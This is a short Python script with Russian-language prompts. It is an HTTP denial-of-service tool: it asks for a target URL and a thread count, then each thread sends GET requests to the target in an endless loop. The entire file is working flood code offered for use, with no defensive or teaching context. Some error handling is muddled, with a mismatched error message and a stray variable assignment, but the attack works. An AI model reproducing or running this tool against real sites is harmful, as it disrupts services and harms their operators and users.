import colorama
import threading
import requests

colorama.init(autoreset=True)

def dos (target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + 'Отправлен запрос' + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + '[+] ' + colorama.Fore.LIGHTGREEN_EX + 'Ошибка подключение')
            threads = 20

url = input('URL: ')

try:
    threads = int(input('Потоки: '))
except ValueError:
    exit('Число потоков некорректное!')

if threads == 0:
    exit('URL не содержит http или https!')

if not url.__contains__('http'):
    exit('URL не содержит http или https!')

if not url.__contains__('.'):
    exit('Неверный домен')

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + ' поток запущен!')
